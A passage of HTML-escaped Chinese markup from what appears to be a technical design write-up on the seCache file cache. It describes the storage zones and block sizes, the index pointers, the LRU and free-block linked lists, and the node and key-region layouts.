style=&quot;font-family:宋体;&quot;&gt;算法得出该存储区中需要淘汰的缓存文件以供新文件的存入。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;现根据经验默认预设为&lt;span style=&quot;font-family:times new roman;&quot;&gt;8&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;个存储区&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;(schema)&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;，块大小分别为：&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;512,3K,8K,&amp;nbsp;20K,30K,50K,&amp;nbsp;80K,256K&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;。&amp;nbsp;各存储区占用的空间大小分别为：&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;2M&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;，&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;3M&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;，&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;3M&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;，&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;5M&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;，&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;5M&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;，&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;5M&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;，&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;3M&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;，&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;4M&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;，共&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;30M&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;空间。后台增加空间，按此比例调整。存储区最大可设置至&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;16&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;个。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;table style=&quot;padding:0pt 5.4pt;border-collapse:collapse;margin-left:32.4pt;&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;border:0.5pt solid #000000;padding:0pt 5.4pt;width:109.6pt;&quot; valign=&quot;top&quot; width=&quot;146&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;块大小&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:142.05pt;&quot; valign=&quot;top&quot; width=&quot;189&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;块数&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:99.35pt;&quot; valign=&quot;top&quot; width=&quot;132&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;占用空间&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:109.6pt;&quot; valign=&quot;top&quot; width=&quot;146&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;512&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:142.05pt;&quot; valign=&quot;top&quot; width=&quot;189&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;4K&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:99.35pt;&quot; valign=&quot;top&quot; width=&quot;132&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:109.6pt;&quot; valign=&quot;top&quot; width=&quot;146&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;3K&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:142.05pt;&quot; valign=&quot;top&quot; width=&quot;189&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;512&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:99.35pt;&quot; valign=&quot;top&quot; width=&quot;132&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:109.6pt;&quot; valign=&quot;top&quot; width=&quot;146&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;8K&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:142.05pt;&quot; valign=&quot;top&quot; width=&quot;189&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;256&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:99.35pt;&quot; valign=&quot;top&quot; width=&quot;132&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:109.6pt;&quot; valign=&quot;top&quot; width=&quot;146&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;20K&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:142.05pt;&quot; valign=&quot;top&quot; width=&quot;189&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:99.35pt;&quot; valign=&quot;top&quot; width=&quot;132&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:109.6pt;&quot; valign=&quot;top&quot; width=&quot;146&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;32K&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:142.05pt;&quot; valign=&quot;top&quot; width=&quot;189&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:99.35pt;&quot; valign=&quot;top&quot; width=&quot;132&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:109.6pt;&quot; valign=&quot;top&quot; width=&quot;146&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;50K&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:142.05pt;&quot; valign=&quot;top&quot; width=&quot;189&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:99.35pt;&quot; valign=&quot;top&quot; width=&quot;132&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:109.6pt;&quot; valign=&quot;top&quot; width=&quot;146&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;80K&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:142.05pt;&quot; valign=&quot;top&quot; width=&quot;189&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:99.35pt;&quot; valign=&quot;top&quot; width=&quot;132&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:109.6pt;&quot; valign=&quot;top&quot; width=&quot;146&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;256K&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:142.05pt;&quot; valign=&quot;top&quot; width=&quot;189&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;32&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:99.35pt;&quot; valign=&quot;top&quot; width=&quot;132&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;br /&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;在&lt;span style=&quot;font-family:times new roman;&quot;&gt;seCache&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;索引区中存在&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;8&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;组指针：分别是数据文件中对应存储区的存储分配起始地址&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;(Store&amp;nbsp;Start)&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;及终止地址指针&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;(Store&amp;nbsp;End)&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;、已分配区域底部指针&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;(Store&amp;nbsp;Break)&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;a href=&quot;http://www.flickr.com/photos/41213427@N08/3821370529/&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;&lt;img src=&quot;http://farm3.static.flickr.com/2557/3821370529_ea94ed00b4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;text-align:center;&quot;&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;text-align:left;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;缓存系统存储指针与数据文件示意图&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;text-align:left;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;上图中，左侧为各存储区的指针组，记录在&lt;span style=&quot;font-family:times new roman;&quot;&gt;seCache &lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;索引文件中，右侧为数据文件的各存储区示意图，由上图可以看到，&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;Size&amp;nbsp;1&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;存储区、&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;Size&amp;nbsp;2&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;存储区、&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;Size&amp;nbsp;N&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;存储区分别处于未分配完毕、已分配完毕、未分配状态。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;LRU&lt;span style=&quot;font-family:宋体;&quot;&gt;双向链表分为&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;8&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;个，空闲块单向链表也为&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;8&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;个，同时还有&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;8&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;组指针，每一组指针分别是指向对应&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;LRU&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;链表头的指针（&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;LRU&amp;nbsp;top&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;）、&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;LRU&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;链表尾的指针（&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;LRU&amp;nbsp;bottom&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;）和指向对应空闲块链表入口的指针（&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;Free&amp;nbsp;pointer&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;）。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;节点的数据结构如下：&lt;/span&gt;&lt;/p&gt;\r\n&lt;table style=&quot;padding:0pt 5.4pt;border-collapse:collapse;margin-left:5.4pt;&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;border:0.5pt solid #000000;padding:0pt 5.4pt;width:45pt;&quot; valign=&quot;top&quot; width=&quot;60&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;LRU&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''times new roman'';&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;LEFT&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:45pt;&quot; valign=&quot;top&quot; width=&quot;60&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;HASH&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;LEFT&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:63pt;&quot; valign=&quot;top&quot; width=&quot;84&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;文件&lt;span style=&quot;font-family:times new roman;&quot;&gt;MD5&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;标识&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:90pt;&quot; valign=&quot;top&quot; width=&quot;120&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;本文件在数据文件中的存储位置&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:52.8pt;&quot; valign=&quot;top&quot; width=&quot;70&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;文件长度&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:45pt;&quot; valign=&quot;top&quot; width=&quot;60&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;HASH&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;RIGHT&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;td style=&quot;padding:0pt 5.4pt;width:45pt;&quot; valign=&quot;top&quot; width=&quot;60&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;LRU&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;RIGHT&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;经&lt;span style=&quot;font-family:times new roman;&quot;&gt;PACK&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;后总长为&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;32&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;字节。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;a href=&quot;http://www.flickr.com/photos/41213427@N08/3822180034/&quot; target=&quot;_blank&quot;&gt;&lt;span&gt;&lt;img src=&quot;http://farm3.static.flickr.com/2531/3822180034_29667c47f2.jpg&quot; alt=&quot;&quot; width=&quot;500&quot; height=&quot;317&quot; /&gt;&lt;/span&gt;&lt;/a&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt; &lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;缓存系统索引示意图&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;/p&gt;\r\n&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;seCache&amp;nbsp;key&lt;span style=&quot;font-family:宋体;&quot;&gt;区域结构如下：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;table style=&quot;padding:0pt 5.4pt;border-collapse:collapse;margin-left:104.4pt;&quot; border=&quot;0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&quot;border:0.5pt solid #000000;padding:0pt 5.4pt;width:198pt;&quot; valign=&quot;top&quot; width=&quot;264&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;text-align:center;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;保留区域&lt;span style=&quot;font-family:times new roman;&quot;&gt;(10&amp;nbsp;Bytes)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:198pt;&quot; valign=&quot;top&quot; width=&quot;264&quot;&gt;&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;LRU&lt;span style=&quot;font-family:宋体;&quot;&gt;链表栈顶地址&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;(4&amp;nbsp;Bytes)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:198pt;&quot; valign=&quot;top&quot; width=&quot;264&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;text-align:center;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;LRU&lt;span style=&quot;font-family:宋体;&quot;&gt;链表栈底地址&lt;/span&gt;&lt;span style=&quot;font-family:times new roman;&quot;&gt;(4&amp;nbsp;Bytes)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:198pt;&quot; valign=&quot;top&quot; width=&quot;264&quot;&gt;&lt;p style=&quot;text-indent:21.75pt;margin-bottom:0pt;margin-top:0pt;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;回收链表队列入口地址&lt;span style=&quot;font-family:times new roman;&quot;&gt;(4&amp;nbsp;Bytes)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr&gt;&lt;td style=&quot;padding:0pt 5.4pt;width:198pt;&quot; valign=&quot;top&quot; width=&quot;264&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;text-align:center;&quot;&gt;&lt;span style=&quot;font-size:10.5pt;font-family:''宋体'';&quot;&gt;保留区域&lt;span style=&quot;font-family:times new roman;&quot;&gt;(100&amp;nbsp;Bytes)&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;tr style=&quot;height:49.4pt;&quot;&gt;&lt;td style=&quot;padding:0pt 5.4pt;background:none repeat scroll 0% 0% #7f7f7f;width:198pt;&quot; valign=&quot;center&quot; width=&quot;264&quot;&gt;&lt;p style=&quot;margin-bottom:0pt;margin-top:0pt;text-align:center;&quot;&gt;&lt;span style=&quot;background-color:#c0c0c0;background-image:none;background-repeat:repeat;background-attachment:scroll;background-position:0% 0%;-moz-background-size:auto 